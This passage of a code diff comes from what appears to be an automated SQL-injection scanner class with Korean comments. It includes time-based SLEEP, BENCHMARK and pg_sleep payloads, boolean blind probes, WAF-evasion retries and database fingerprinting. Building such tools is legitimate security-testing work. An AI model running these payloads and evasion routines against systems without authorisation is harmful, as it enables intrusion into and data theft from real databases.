+        # 실패하면 skip에 넣어 전체 탐색에서 중복만 피한다(캐시가 빈 1회성 시도).
         if not cached_name:
             discovery_name = self._discovery_evasion_hint.get((surface.url, surface.param))
             if discovery_name and discovery_name != tried_and_failed:
@@ -633,23 +581,21 @@ class SQLiStrategy(BaseStrategy):
                        dialect: str | None = None, quiet: bool = False):
         """WAF 인지 전송 — 차단되면 자동으로 우회를 시도한다.
 
-        모든 probe/공격벡터 확인 코드가 raw _send() 대신 이걸 쓰면, WAF 감지·우회·기록이
-        한 곳에서 일관되게 처리된다.
+        모든 probe/공격벡터 코드가 raw _send() 대신 이걸 쓰면 WAF 감지·우회·기록이 한 곳에서
+        일관되게 처리된다.
 
-        quiet=True면 우회 성공/실패의 [Evade] 개별 로그를 찍지 않는다 — waf_hits/waf_evasions
-        기록은 그대로 남으니 나중에 필요하면 조회 가능하다. boolean 배치처럼 같은 종류의
-        요청을 짧은 시간에 여럿 보낼 때, 호출부가 결과를 모아 한 줄로 요약해서 찍고 싶을 때
-        쓴다.
+        quiet=True면 우회 성공/실패의 [Evade] 개별 로그를 안 찍는다 — 기록은 남으니 나중에 조회
+        가능하다. boolean 배치처럼 같은 요청을 짧은 시간에 여럿 보낼 때, 호출부가 한 줄로 요약해
+        찍고 싶을 때 쓴다.
 
-        반환: (status, body, elapsed, 실제 사용된 payload, 우회했는지 여부).
-        완전히 실패(요청 실패 또는 우회 전부 실패)하면 (None, '', 0.0, payload, False).
+        반환: (status, body, elapsed, 실제 사용된 payload, 우회 여부). 완전 실패면 (None, '', 0.0, payload, False).
         """
         status, body, elapsed = self._send(surface, {**base_fields, surface.param: payload}, timeout=timeout)
         if status is None:
             return None, '', 0.0, payload, False
 
-        # 벤(recon 학습)과 WAF를 한 기준으로 통합한 거부 판정 — 밴 토큰이거나 벤더 WAF일 때만
-        # 거부로 본다(_is_refused 참고). 예전 길이 재분류 해킹은 여기서 제거됐다.
+        # 밴(recon 학습)과 WAF를 한 기준으로 통합한 거부 판정 — 밴 토큰이거나 벤더 WAF일 때만
+        # 거부로 본다(_is_refused 참고).
         if not self._is_refused(surface, payload, status, body):
             return status, body, elapsed, payload, False
         evaded = self._try_evade(surface, base_fields, payload, label, waf_hits, waf_evasions,
@@ -667,18 +613,17 @@ class SQLiStrategy(BaseStrategy):
         """이 엔드포인트가 stateful(요청마다 상태가 바뀜)인지, 그리고 페이지의 진짜 요청별
         변동폭(page_noise)을 판정한다.
 
-        완전히 동일한 benign 요청(base_fields — 우리 입력을 바꾸지 않는다)을 IDEMPOTENCY_PROBES개
-        '순차로' 보내(병렬은 상태 레이스로 측정을 오염시킨다) 첫 응답 대비 이후 응답들의 visible
-        text diff를 잰다. 로그인 폼의 '틀린 로그인 N회 후 리셋/잠금'처럼 누적 상태가 있으면, 같은
-        요청을 여러 번 보내는 것 자체가 그 카운터를 넘겨 응답이 도중에 바뀌는 걸로 드러난다 —
-        그래서 2회(기존 노이즈 측정)로는 부족하고 카운터 임계값을 넘길 만큼 보낸다.
+        똑같은 정상 요청(base_fields — 우리 입력을 바꾸지 않는다)을 IDEMPOTENCY_PROBES개 순차로 보내
+        (병렬은 상태 레이스로 측정을 오염시킨다) 첫 응답 대비 이후 응답들의 visible text diff를 잰다.
+        로그인 폼의 틀린 로그인 N회 후 리셋/잠금처럼 누적 상태가 있으면, 같은 요청을 여러 번 보내는
+        것 자체가 카운터를 넘겨 응답이 도중에 바뀐다 — 그래서 2회로는 부족하고 임계값을 넘길 만큼 보낸다.
 
-        page_noise(첫 응답 대비 최대 diff)가 STATEFUL_NOISE_THRESHOLD를 넘으면 stateful로 보고
-        (호출부가 content 오라클을 끄고 시간 기반으로 전환), 안 넘으면 그 값을 이후 boolean/blind/
-        ORDER BY 판정의 동적 임계값 바닥으로 그대로 쓴다(엔드포인트당 한 번만 재고 공유).
+        page_noise(첫 응답 대비 최대 diff)가 STATEFUL_NOISE_THRESHOLD를 넘으면 stateful로 보고(호출부가
+        content 오라클을 끄고 시간 기반으로 전환), 안 넘으면 그 값을 이후 boolean/blind/ORDER BY 판정의
+        동적 임계값 바닥으로 쓴다(엔드포인트당 한 번만 재고 공유).
 
-        결과는 (url, method)로 캐싱한다. first_body는 run()이 이미 받아둔 baseline 응답으로,
-        첫 샘플로 재사용해 요청 1개를 아낀다. 반환: (stateful, page_noise, trace)."""
+        결과는 (url, method)로 캐싱한다. first_body는 run()이 받아둔 baseline을 첫 샘플로 재사용해
+        요청 1개를 아낀다. 반환: (stateful, page_noise, trace)."""
         key = (surface.url, surface.method)
         cached = self._idempotency.get(key)
         if cached is not None:
@@ -760,41 +705,33 @@ class SQLiStrategy(BaseStrategy):
         return None
 
     def _probe_hidden_syntax_break(self, surface, base_fields, waf_hits: list, waf_evasions: list) -> dict | None:
-        """hidden_param(퍼징으로 발견돼서 크롤링 시점의 실제 값을 본 적이 없는 필드) 전용 —
-        _probe_arithmetic의 '원본 값과 비교' 방식은 원본 값을 모르니 못 쓴다(_base_fields가
-        채우는 값은 실제 원본이 아니라 고정 문자열 'test').
+        """hidden_param(퍼징으로 발견돼 크롤링 때 실제 값을 본 적 없는 필드) 전용 — _probe_arithmetic의
+        원본 값 비교 방식은 원본 값을 모르니 못 쓴다(_base_fields가 채우는 건 실제 원본이 아니라
+        고정 문자열 test).
 
-        긍정 등가("A와 B가 산술적으로 같으니 응답도 같다")는 약한 증거다 — 파라미터가
-        사실상 무시되거나 문자열로만 처리돼도 우연히 비슷한 응답이 나올 수 있어서 여러
-        세계와 양립한다. 대신 괄호 짝을 이용한 문법 비대칭을 쓴다 — "짝이 맞으면 정상,
-        깨면 에러, 다시 맞추면 정상"이라는 재현 가능한 패턴은 그 괄호를 실제 문법 단위로
-        해석하는 파서(=SQL 엔진)가 있을 때만 나온다. 앱단이 숫자만 허용하는 자체 검증을
-        하고 있다면 균형(valid)/불균형(broken) 값 전부 똑같이 튕겨나가서 이 패턴 자체가
-        안 나오고, int()류 캐스팅도 괄호 문자를 특별 취급할 이유가 없어 마찬가지로 이
-        패턴이 안 나온다 — 즉 이 판정 방식 자체가 "숫자만 걸러내는 검증"이나 "파라미터
-        무시" 같은 오탐 원인을 자연스럽게 걸러낸다.
+        긍정 등가(A와 B가 산술적으로 같으니 응답도 같다)는 약한 증거다 — 파라미터가 무시되거나
+        문자열로만 처리돼도 우연히 비슷한 응답이 날 수 있다. 대신 괄호 짝의 문법 비대칭을 쓴다 —
+        짝이 맞으면 정상, 깨면 에러, 다시 맞추면 정상이라는 재현 가능한 패턴은 괄호를 문법 단위로
+        해석하는 파서(=SQL 엔진)가 있을 때만 나온다. 앱단이 숫자만 허용하는 검증을 하면 균형/불균형
+        값이 똑같이 튕겨 이 패턴이 안 나오고, int() 캐스팅도 괄호를 특별 취급할 이유가 없어 마찬가지다
+        — 즉 이 판정 자체가 숫자 검증이나 파라미터 무시 같은 오탐 원인을 걸러낸다.
 
-        base=9, bal1=(9), bal2=((9))는 균형이 맞아 baseline과 비슷해야 하고, broken1=9),
-        broken2=(9는 불균형이라 baseline과 달라야 한다 — 이 두 조건이 동시에 성립할 때만
-        숫자형 SQL 파싱으로 1차 판정한다. 노이즈 기준은 이번 세션에서 boolean/blind/
-        ORDER BY에 적용한 것과 동일하게 페이지 자체의 요청별 흔들림을 재서 동적으로 잡는다.
+        base=9, bal1=(9), bal2=((9))는 균형이라 baseline과 비슷해야 하고, broken1=9), broken2=(9는
+        불균형이라 baseline과 달라야 한다 — 이 두 조건이 동시에 성립할 때만 숫자형 SQL 파싱으로 1차
+        판정한다. 노이즈 기준은 페이지 자체의 요청별 흔들림을 재서 동적으로 잡는다.
 
-        1차 판정만으로 확정하지 않고, broken1을 한 번 더 보내 같은 결과가 재현되는지
-        확인한 뒤에만 최종 확정한다 — 우연한 노이즈로 인한 오탐을 배제하기 위한 재현성
-        체크다(_probe_boolean의 재검증과 같은 원칙).
+        1차 판정만으로 확정하지 않고, broken1을 한 번 더 보내 같은 결과가 재현될 때만 최종 확정한다 —
+        우연한 노이즈로 인한 오탐을 배제하는 재현성 체크다(_probe_boolean의 재검증과 같은 원칙).
         """
         noise_texts = []
         for _ in range(2):
             status, body, _ = self._send(surface, {**base_fields, surface.param: 'A' * 10})
             noise_texts.append(visible_text(body) if status is not None else '')
         page_noise = diff_score(noise_texts[0], noise_texts[1])
-        # boolean/blind/ORDER BY와 달리 바닥값을 5가 아니라 1로 낮게 잡는다 — 이 probe는
-        # hidden_param 전용이라, "숨겨진 파라미터에 값을 넣었더니 반응이 달라졌다"는 것 자체가
-        # 이미 그 파라미터가 뭔가에 실제로 쓰이고 있다는 강한 사전 신호다(존재 자체를 몰랐던
-        # 필드니까). "Good!"/"Bad!"처럼 응답 전체가 몇 글자 안 되는 페이지에서는 진짜 SQL
-        # 에러가 나도 diff가 1~4에 그칠 수 있는데(실측: diff_score("Good!","Bad!")=3), 5라는
-        # 바닥값은 이런 짧은 응답 자체를 통째로 못 잡을 만큼 높다. noise가 0으로 실측(완전
-        # 결정적 페이지로 확인)됐을 때 5라는 임의의 안전마진을 얹을 근거도 약하다.
+        # boolean/blind/ORDER BY와 달리 바닥값을 5가 아니라 1로 낮게 잡는다 — 이 probe는 hidden_param
+        # 전용이라, 숨겨진 파라미터에 값을 넣었더니 반응이 달라졌다는 것 자체가 그 파라미터가 실제로
+        # 쓰인다는 강한 사전 신호다(존재조차 몰랐던 필드니까). 응답 전체가 몇 글자뿐인 페이지에선 진짜
+        # SQL 에러가 나도 diff가 1~4에 그칠 수 있어, 바닥값 5는 이런 짧은 응답을 통째로 못 잡는다.
         noise_threshold = max(page_noise * 2, 1)
 
         values = {'base': '9', 'bal1': '(9)', 'bal2': '((9))', 'broken1': '9)', 'broken2': '(9'}
@@ -810,10 +747,9 @@ class SQLiStrategy(BaseStrategy):
 
         diffs = {label: diff_score(texts['base'], texts[label])
                  for label in ('bal1', 'bal2', 'broken1', 'broken2')}
-        # balanced_ok가 <=(이하)라 threshold와 같은 diff도 '정상'으로 받아주는 것과 대칭을
-        # 맞추려면 broken_signal도 >=(이상)여야 한다 — diff가 정확히 threshold와 같은
-        # 경계 케이스를 "신호 없음"으로 놓치지 않기 위함(실측 사례: noise=0, threshold=1
-        # 상황에서 broken diff가 정확히 1로 나온 적 있음).
+        # balanced_ok가 <=(이하)라 threshold와 같은 diff도 정상으로 받는 것과 대칭을 맞추려면
+        # broken_signal도 >=(이상)이어야 한다 — diff가 정확히 threshold와 같은 경계 케이스를 신호
+        # 없음으로 놓치지 않기 위해서다.
         balanced_ok   = diffs['bal1'] <= noise_threshold and diffs['bal2'] <= noise_threshold
         broken_signal = diffs['broken1'] >= noise_threshold and diffs['broken2'] >= noise_threshold
         print(f"    [Syntax] hidden 필드 괄호 짝 판별: noise={page_noise} threshold={noise_threshold} "
@@ -846,32 +782,24 @@ class SQLiStrategy(BaseStrategy):
 
     def _probe_numeric_comment(self, surface, base_fields, injection_prefix: str, vuln_entry: dict,
                                 waf_hits: list, waf_evasions: list) -> tuple[str, int | None, str | None]:
-        """숫자형/산술 경로(_probe_arithmetic/_probe_hidden_syntax_break)로 확정된 필드에서
-        이후 열거 페이로드에 쓸 comment를 정하고, 동시에 '진짜 정상' 기준 응답도 확보해서
-        돌려준다.
+        """숫자형/산술 경로로 확정된 필드에서 이후 열거 페이로드에 쓸 comment를 정하고, 동시에 진짜
+        정상 기준 응답도 확보해 돌려준다.
 
-        두 확정 방식 다 comment를 전혀 안 쓴 페이로드로 성공했다 — 즉 인젝션 지점 뒤에는
-        원래 아무것도 안 남는다는 뜻이다(예: level={level}이 쿼리의 끝). 이 사실을 이용해서
-        SQL_DIALECTS의 version_fn(순수 표현식이라 comment 불필요)을 comment 없이 그대로
-        값 자리에 꽂아 dialect를 판별한다 — 방언이 맞으면 함수가 정상 실행돼 '정상' 기준
-        텍스트와 비슷하게 나오고, 틀리면 없는 함수라 에러가 나서 '에러' 기준 텍스트와
-        비슷하게 나온다(_bool_oracle과 같은 '더 가까운 쪽' 판정 원리).
+        두 확정 방식 다 comment 없이 성공했다 — 인젝션 지점 뒤에 원래 아무것도 안 남는다는 뜻이다.
+        이를 이용해 SQL_DIALECTS의 version_fn(순수 표현식이라 comment 불필요)을 값 자리에 그대로 꽂아
+        dialect를 판별한다 — 방언이 맞으면 함수가 정상 실행돼 정상 기준과 비슷하게, 틀리면 없는 함수라
+        에러가 나 에러 기준과 비슷하게 나온다(_bool_oracle과 같은 더 가까운 쪽 판정).
 
-        판별에 성공하면 comment가 필요 없다는 것도 같이 증명된 셈이라 ''를 쓰고,
-        vuln_entry['detected_db']도 채워서 _blind_extract_boolean의 _resolve_dialect가
-        재프로빙 없이 재사용하게 한다. 판별에 실패하면(기준 응답 자체가 안 갈리거나, 3개
-        방언 다 에러 쪽에 가까움) 안전한 기본값(--, SQLite/MySQL/PostgreSQL 공통)으로
-        폴백한다 — #는 MySQL 전용이라 다른 방언에서 그 자체가 구문 오류를 낼 수 있다.
+        판별에 성공하면 comment가 필요 없다는 것도 증명된 셈이라 빈 문자열을 쓰고, detected_db도 채워
+        _resolve_dialect가 재프로빙 없이 재사용하게 한다. 실패하면(기준 응답이 안 갈리거나 모든 방언이
+        에러 쪽) 안전한 기본값(--, 여러 방언 공통)으로 폴백한다.
 
-        여기서 확보하는 '정상' 기준 응답(injection_prefix 단독 전송 결과)은 run()이
-        _go_enumerate의 baseline으로도 재사용한다 — run() 맨 처음에 캡처한 baseline_body는
-        원본 값을 모르는 hidden 필드라 placeholder('test')로 받은 건데, level 같은 숫자형
-        컬럼에 따옴표 없이 그대로 꽂히는 필드에서는 'test'가 문자열이 아니라 존재하지 않는
-        컬럼 참조로 파싱돼서 그 자체가 에러 응답일 수 있다(baby-sqlite에서 실제로 확인됨:
-        level=test → "no such column: test" → 앱이 잡아서 "Error!" 반환). 이런 필드에서
-        stale한 placeholder 기반 baseline과 비교하면 판정이 통째로 뒤집힌다(정상 응답이
-        baseline과 달라서 '깨졌다'고, 진짜 깨진 응답이 baseline과 같아서 '정상'이라고
-        오판) — 그래서 injection_prefix 단독 응답(확실히 유효한 값)을 새 baseline으로 쓴다.
+        여기서 확보하는 정상 기준 응답(injection_prefix 단독 전송 결과)은 run()이 _go_enumerate의
+        baseline으로도 재사용한다 — 처음 캡처한 baseline_body는 원본 값을 모르는 hidden 필드라
+        placeholder(test)로 받은 건데, 숫자형 컬럼에 따옴표 없이 꽂히는 필드에선 test가 존재하지 않는
+        컬럼 참조로 파싱돼 그 자체가 에러 응답일 수 있다. 그러면 판정이 통째로 뒤집혀서(정상 응답이
+        baseline과 달라 깨졌다고, 깨진 응답이 baseline과 같아 정상이라고 오판) injection_prefix 단독
+        응답을 새 baseline으로 쓴다.
         """
         ref_ok_status, ref_ok_body, _, _, _ = self._send_evading(
             surface, base_fields, injection_prefix, 'enum(dialect-ref-ok)', waf_hits, waf_evasions,
@@ -915,23 +843,20 @@ class SQLiStrategy(BaseStrategy):
         q = quote_char
         return [
             # SLEEP/BENCHMARK를 OR/AND로 그냥 붙이거나 (SELECT SLEEP(5)) 같은 맨 스칼라 서브쿼리로
-            # 넣으면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼 곱해진다(실측: 9.86s→
-            # 50.44s ~5배; 맨 스칼라로 바꿨다가 N배 지연으로 타임아웃 재현됨). 그래서 파생 테이블
-            # 서브쿼리 (SELECT ...)x로 감싸 옵티마이저가 딱 한 번만 materialize하게 한다.
+            # 넣으면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼 곱해진다(수 배~N배로 타임아웃
+            # 위험). 그래서 파생 테이블 서브쿼리 (SELECT ...)x로 감싸 옵티마이저가 한 번만 materialize하게 한다.
             #
-            # 동시에 '무행(side-effect-free)'이어야 한다 — 바깥을 SELECT 0으로 하면 서브쿼리 값이
-            # 0 → 'OR 0'이라 행을 반환하지 않는다. 로그인 폼 WHERE에 행이 반환되면 앱이 로그인
-            # 성공으로 처리하거나 더블체크/리셋/잠금/로깅 같은 부작용을 내는데(실측: 어떤 타깃은
-            # 인젝션이 행을 반환할 때마다 계정 비번을 리셋), 지연만 목적인 SLEEP/BENCHMARK는 값을
-            # SELECT 0으로 버려 무행으로 만든다 — 예전 SELECT 1은 행을 반환해 이 부작용이 있었다.
+            # 동시에 무행(side-effect-free)이어야 한다 — 바깥을 SELECT 0으로 하면 서브쿼리 값이 0이라
+            # 행을 반환하지 않는다. 로그인 폼 WHERE에 행이 반환되면 앱이 로그인 성공 처리나 리셋/잠금/
+            # 로깅 같은 부작용을 낼 수 있어(지연만 목적인데), SLEEP/BENCHMARK는 값을 SELECT 0으로 버려
+            # 무행으로 만든다.
             ('MySQL_OR',   f"{q} OR (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
             ('MySQL_AND',  f"{q} AND (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
-            # SLEEP이 밴리스트(SLEEP 키워드 자체를 막는 필터)에 걸려 위 둘 다 실패했을 때만
-            # 순서상 자연스럽게 시도되는 폴백. BENCHMARK는 SLEEP과 문법이 겹치지 않는 MySQL
-            # 전용 CPU 반복 연산 함수라 SLEEP 금지어 필터를 우회한다. 다만 걸리는 시간이
-            # 고정 지연이 아니라 서버 CPU 속도/부하에 좌우돼 SLEEP보다 불안정하므로, SLEEP이
-            # 통하면 항상 SLEEP을 우선시키고 이건 최후 수단으로만 쓴다. 여기도 위와 같은
-            # 이유로 파생 테이블(run-once) + SELECT 0(무행).
+            # SLEEP이 밴리스트에 걸려 위 둘 다 실패했을 때만 순서상 자연스럽게 시도되는 폴백.
+            # BENCHMARK는 SLEEP과 문법이 안 겹치는 MySQL 전용 CPU 반복 함수라 SLEEP 금지어 필터를
+            # 우회한다. 다만 걸리는 시간이 서버 CPU/부하에 좌우돼 SLEEP보다 불안정하므로, SLEEP이
+            # 통하면 항상 우선하고 이건 최후 수단으로만 쓴다. 여기도 같은 이유로 파생 테이블(run-once)
+            # + SELECT 0(무행).
             ('MySQL_OR_BENCHMARK',  f"{q} OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
             ('MySQL_AND_BENCHMARK', f"{q} AND (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
             ('PostgreSQL', f"{q}; SELECT pg_sleep(5) --"),
@@ -947,13 +872,11 @@ class SQLiStrategy(BaseStrategy):
         # 본문 증거나 time-based 확정을 더 찾아본다 — 끝까지 없으면 이걸 최후 수단으로 반환.
         fallback = None
 
-        # recon이 에러 시그니처로 이미 DB를 확인해뒀으면(surface.extra['detected_db'])
-        # 그 DB 계열 페이로드만 시도한다 — 안 그러면 이미 아는 걸 무시하고 5개 DB를 매번
-        # blind로 다시 찔러보게 된다. db_name이 'MySQL_OR'/'MySQL_AND'처럼 같은 DB의 여러
-        # 구조 변형일 수 있어서, 이름이 known_dialect로 '시작'하는 항목을 전부 남긴다(한
-        # 구조만 시도하면 그 구조가 우연히 안 통할 때 확정을 놓칠 수 있어서). known_dialect가
-        # 없거나 _db_payloads에 매칭되는 항목이 아예 없으면(예: SQLite — 아래 목록엔 항목
-        # 자체가 없음) 기존처럼 전체를 순회한다.
+        # recon이 에러 시그니처로 이미 DB를 확인해뒀으면(surface.extra['detected_db']) 그 DB 계열
+        # 페이로드만 시도한다 — 안 그러면 아는 걸 무시하고 여러 DB를 매번 blind로 다시 찔러본다.
+        # db_name이 MySQL_OR/MySQL_AND처럼 같은 DB의 여러 구조 변형일 수 있어, 이름이 known_dialect로
+        # 시작하는 항목을 전부 남긴다(한 구조만 쓰면 그게 우연히 안 통할 때 확정을 놓친다). known_dialect가
+        # 없거나 매칭되는 항목이 없으면(예: SQLite — 목록에 항목 자체가 없음) 기존처럼 전체를 순회한다.
         db_payloads = self._db_payloads(quote_char)
         if known_dialect:
             filtered = [(name, p) for name, p in db_payloads if name.startswith(known_dialect)]
@@ -1023,12 +946,10 @@ class SQLiStrategy(BaseStrategy):
                     print(f"    [ET] db={db_name} 검증 요청도 느림 → 서버 렉, 다음 DB로")
                     continue
 
-                # 2차 재현성 확인 — baseline이 빨랐다는 것만으로는 "이 페이로드가 원인"이란
-                # 증거가 안 된다. 취약점과 무관한 필드에서도 인프라/네트워크의 단발성 지연이
-                # 우연히 딱 한 번 걸릴 수 있고(실측: 무관한 필드에서 baseline 대비 3배 가까운
-                # 우연한 스파이크가 관측됨), 그 직후의 baseline 재요청은 원인이 뭐였든 자연스레
-                # 빠르게 나오므로 1차 검증만으로는 우연과 진짜 SQLi를 구분 못 한다. 같은 공격
-                # 페이로드를 한 번 더 보내서 지연이 재현되는지까지 확인해야 확정할 수 있다.
+                # 2차 재현성 확인 — baseline이 빨랐다는 것만으로는 이 페이로드가 원인이란 증거가
+                # 안 된다. 취약점과 무관한 필드에서도 인프라/네트워크의 단발성 지연이 우연히 한 번
+                # 걸릴 수 있고, 그 직후 baseline 재요청은 원인이 뭐였든 자연히 빨라져 1차 검증만으론
+                # 우연과 진짜 SQLi를 못 가린다. 같은 공격 페이로드를 한 번 더 보내 지연이 재현될 때만 확정한다.
                 r_status, _, r_elapsed, _, _ = self._send_evading(
                     surface, base_fields, payload, f'error/time({db_name},verify)', waf_hits, waf_evasions,
                     timeout=self.TIME_TIMEOUT,
@@ -1066,19 +987,15 @@ class SQLiStrategy(BaseStrategy):
         noise_threshold = max(page_noise * 2, 5)
         print(f"    [Bool] page_noise={page_noise} → threshold={noise_threshold}")
 
-        # quote_signal['hopeless']는 quote probe 결과의 '참고 정보'일 뿐, 그것만으로 boolean의
-        # quote 포함 페이로드를 예단해서 스킵하지 않는다 — quote probe는 따옴표 하나짜리
-        # 단순한 구조라, 그게 막혔다고 AND/OR가 붙은 boolean 페이로드도 똑같이 막힌다는 보장은
-        # 없다(실제로 페이로드 구조에 따라 우회 성패가 갈리는 걸 이전에 확인한 바 있다). 그래서
-        # boolean은 자기 구조로 첫 quote 포함 페이로드를 반드시 한 번 직접 시도해보고, '그것도'
-        # 실패했을 때만(quote probe 실패 + boolean 자체 확인 실패, 두 증거가 겹칠 때만) 이후
-        # quote 포함 페이로드를 스킵한다.
-        # BOOLEAN_BATCH_SIZE개씩 묶어서 배치 안의 true/false 요청을 동시에 쏜다. 배치와 배치
-        # 사이는 순차라서, 신호를 찾거나 quote_hopeless가 확정되면 다음 배치부터 바로 반영된다
-        # — 다만 같은 배치 안의 페이로드들은 hopeless 여부가 확정되기 전에 이미 다 제출된
-        # 상태라, 그 배치 안에서 hopeless가 확정되면 최대 (BOOLEAN_BATCH_SIZE-1)쌍은 이미
-        # 보낸 뒤일 수 있다 — WAF가 quote를 확실히 차단하는 좁은 경우에만 생기는 손실이라
-        # 감수한다.
+        # quote_signal['hopeless']는 quote probe 결과의 참고 정보일 뿐, 그것만으로 boolean의 quote 포함
+        # 페이로드를 예단해 스킵하지 않는다 — quote probe는 따옴표 하나짜리라, 그게 막혔다고 AND/OR가
+        # 붙은 boolean 페이로드도 똑같이 막힌다는 보장은 없다(페이로드 구조에 따라 우회 성패가 갈린다).
+        # 그래서 boolean은 자기 구조로 첫 quote 포함 페이로드를 반드시 한 번 직접 시도하고, 그것까지
+        # 실패했을 때만(quote probe 실패 + boolean 자체 확인 실패, 두 증거가 겹칠 때만) 이후 스킵한다.
+        # BOOLEAN_BATCH_SIZE개씩 묶어 배치 안의 true/false 요청을 동시에 쏜다. 배치 사이는 순차라 신호를
+        # 찾거나 quote_hopeless가 확정되면 다음 배치부터 바로 반영된다 — 다만 같은 배치 안 페이로드는
+        # hopeless 확정 전에 이미 제출된 상태라, 배치 안에서 hopeless가 확정되면 최대 (BATCH_SIZE-1)쌍은
+        # 이미 보낸 뒤일 수 있다(WAF가 quote를 확실히 막는 좁은 경우에만 생기는 손실이라 감수한다).
         boolean_quote_hopeless = False
         total_batches = (len(bool_payloads) + self.BOOLEAN_BATCH_SIZE - 1) // self.BOOLEAN_BATCH_SIZE
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.BOOLEAN_BATCH_SIZE * 2 + 2) as pool:
@@ -1093,10 +1010,9 @@ class SQLiStrategy(BaseStrategy):
                     print(f"    [Bool] {batch_label}: 전부 스킵(quote 우회 불가로 이미 확인됨)")
                     continue  # 이 단계에서 첫 quote 포함 페이로드가 이미 실패 확인됨 — 요청 없이 스킵
 
-                # quiet=True — 배치 안 1차 시도는 [Evade] 개별 로그를 찍지 않는다. 어차피
-                # 병렬로 쏘면 여러 스레드의 우회 로그가 뒤섞여서 어느 쌍 것인지 구분도 안 되니,
-                # 개별 로그 대신 배치가 끝난 뒤 우회 필요/성공 건수만 한 줄로 요약한다.
-                # waf_hits/waf_evasions 기록 자체는 quiet과 무관하게 그대로 남는다.
+                # quiet=True — 배치 안 1차 시도는 [Evade] 개별 로그를 안 찍는다. 병렬로 쏘면 여러
+                # 스레드의 우회 로그가 뒤섞여 어느 쌍 것인지 구분이 안 되니, 배치가 끝난 뒤 우회
+                # 필요/성공 건수만 한 줄로 요약한다. 기록은 quiet과 무관하게 그대로 남는다.
                 failed_count = 0
                 evaded_count = 0
                 submitted = [
@@ -1108,17 +1024,16 @@ class SQLiStrategy(BaseStrategy):
                     for orig_true, orig_false, build_fn, style in active
                 ]
 
-                # 원본 리스트 순서대로 결과를 처리해서, 배치 안에서 여러 쌍이 동시에 신호를
-                # 보여도 순차 버전과 동일하게 "먼저 오는 쌍"부터 확정을 시도한다.
+                # 원본 리스트 순서대로 결과를 처리해, 배치 안 여러 쌍이 동시에 신호를 보여도
+                # 순차 버전과 똑같이 먼저 오는 쌍부터 확정을 시도한다.
                 for orig_true, orig_false, build_fn, style, t_future, f_future in submitted:
                     contains_quote = quote_char in orig_true
                     t_status, t_body, _, true_payload, t_evaded = t_future.result()
                     f_status, f_body, _, false_payload, f_evaded = f_future.result()
                     if t_status is None or f_status is None:
-                        # quote_signal['hopeless']가 이미 True(quote probe도 실패)인 상태에서
-                        # boolean 자신의 첫 quote 포함 페이로드까지 실패했을 때만(두 증거 겹칠
-                        # 때만) 스킵을 켠다 — quote probe가 성공했는데 이 템플릿만 우연히
-                        # 실패한 거라면(노이즈 등) 성급하게 나머지를 다 포기하지 않는다.
+                        # quote_signal['hopeless']가 이미 True(quote probe도 실패)인데 boolean 자신의
+                        # 첫 quote 포함 페이로드까지 실패했을 때만(두 증거 겹칠 때만) 스킵을 켠다 —
+                        # quote probe가 성공했는데 이 템플릿만 우연히 실패한 거라면 성급하게 포기하지 않는다.
                         if contains_quote and not boolean_quote_hopeless and quote_signal['hopeless']:
                             boolean_quote_hopeless = True
                             print(f"    [Bool] \"{quote_char}\" 포함 첫 페이로드 우회 실패(quote probe도 실패) — "
@@ -1132,20 +1047,19 @@ class SQLiStrategy(BaseStrategy):
                     true_text, false_text = visible_text(t_body), visible_text(f_body)
                     diff_chars = diff_score(true_text, false_text)
 
-                    # 무신호 페이로드는 로그를 안 남긴다 — 12개를 다 순회하는 동안 나오는 흔한 경우라
-                    # 매번 찍으면 진짜 신호가 그 안에 묻힌다. 후보(신호 있음)일 때만 입을 연다.
+                    # 무신호 페이로드는 로그를 안 남긴다 — 여러 개를 순회하는 동안 나오는 흔한 경우라
+                    # 매번 찍으면 진짜 신호가 묻힌다. 후보(신호 있음)일 때만 입을 연다.
                     if diff_chars <= noise_threshold:
                         continue
 
                     print(f"    [Bool] 후보 발견: payload=\"{true_payload}\" true={len(true_text)}자 "
                           f"false={len(false_text)}자 (diff_chars={diff_chars})")
 
-                    # 재검증 — 후보의 참/거짓 응답 차이가 '정말 SQL 불리언이 평가돼서' 생긴
-                    # 건지, 아니면 앱 필터/상태(예: '해커 감지' 메시지, 시도 횟수 리셋)가 특정
-                    # 페이로드 '내용'에 반응해서 우연히 갈린 건지 구분한다. 같은 쌍을 한 번 더
-                    # 보내는 것만으로는 못 거른다 — 필터는 결정적이라 그대로 재현되기 때문. 대신
-                    # 리터럴만 바꾼 등가 조건들이 참끼리·거짓끼리 그대로 뭉치는지(논리적 등가
-                    # 불변성)를 본다. 자세한 원리는 _verify_boolean_equivalence 참고.
+                    # 재검증 — 후보의 참/거짓 차이가 정말 SQL 불리언이 평가돼 생긴 건지, 아니면 앱
+                    # 필터/상태(해커 감지 메시지, 시도 횟수 리셋)가 특정 페이로드 내용에 반응해 우연히
+                    # 갈린 건지 구분한다. 같은 쌍을 한 번 더 보내는 걸로는 못 거른다(필터는 결정적이라
+                    # 그대로 재현된다). 대신 리터럴만 바꾼 등가 조건들이 참끼리·거짓끼리 그대로 뭉치는지
+                    # (논리적 등가 불변성)를 본다. 원리는 _verify_boolean_equivalence 참고.
                     ok = self._verify_boolean_equivalence(
                         surface, base_fields, build_fn, style, quote_char,
                         true_text, false_text, noise_threshold, waf_hits, waf_evasions, pool,
@@ -1166,16 +1080,15 @@ class SQLiStrategy(BaseStrategy):
                         'diff_chars':         diff_chars,
                         'waf_evaded':         waf_evaded,
                     }
-                    # 방언 판별은 여기서 하지 않는다 — 예전 _fingerprint_db는 raw 응답 길이 +
-                    # "AND version LIKE '%'" 형이라, uid 동등비교(uid='%'가 매칭 0)인 앱에선 참/거짓이
-                    # 안 갈려 Unknown으로 실패했다. 이제 _go_enumerate가 UNION 추출 직전에 '확정된
-                    # boolean 오라클'(OR 기반, diff_score)로 판별한다 — blind에서 쓰는 _resolve_dialect와
-                    # 같은 견고한 방식으로 통일.
+                    # 방언 판별은 여기서 하지 않는다 — raw 응답 길이 + AND version LIKE '%' 방식은 uid
+                    # 동등비교처럼 참/거짓이 안 갈리는 앱에선 Unknown으로 실패한다. 대신 _go_enumerate가
+                    # UNION 추출 직전에 확정된 boolean 오라클(OR 기반, diff_score)로 판별한다 — blind의
